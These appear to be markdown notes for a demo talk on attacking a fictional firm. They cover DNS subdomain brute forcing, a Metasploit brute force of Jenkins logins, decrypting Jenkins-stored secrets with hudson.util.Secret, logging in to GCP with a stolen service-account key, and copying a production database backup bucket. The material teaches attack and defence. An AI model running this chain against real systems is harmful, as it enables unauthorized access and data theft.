# Notes

## Agenda

1. [Getting To Know / DNS Recon](./02_gettingKnow.md)
2. [Jenkins Enum](./03_jenkinsEnum.md)
3. [Jenkins BruteForce](./04_jenkinsBruteforce.md)
4. [Jenkins Recon / Secret Decrypt](./05_jenkinsDecrypt.md)
6. [GCP Login / Lookaround](./06_cloudAccess.md)
7. [Kubernetes Lookaround](./07_kubernetesLookaround.md)
8. [Storage Exfiltrate](./08_storageExfiltrate.md)
9. [What Would Defend](./09_whatWouldDefend.md)

## Some Notes IC-ME

### DNS Reconnaissance

```bash
dnsrecon -t brt -d nevervictimconsult.xyz --threads 25 -D /usr/share/wordlists/subdomains-top1million-5000.txt
```

### Jenkins BruteForce

```bash
[...]
use auxiliary/scanner/http/jenkins_enum
[...]
sed -n 14342050,14342075p /usr/share/wordlists/rockyou.txt > /root/demotalk/jenkinsBrute/passwordlist.txt
[...]
use auxiliary/scanner/http/jenkins_login
set LOGIN_URL j_spring_security_check
set STOP_ON_SUCCESS true
```

### Cloud Access

```java
println( hudson.util.Secret.decrypt("${ENCRYPTED_PASSPHRASE_OR_PASSWORD}") )
```

```bash
gcloud auth activate-service-account --key-file=gcpSa.json
gcloud init --console-only
[...]
gcloud container clusters get-credentials --region=europe-west3 conduit-k8s-test
[...]
gcloud storage cp -r gs://conduit-database-backup-prod/ .
```

</details>
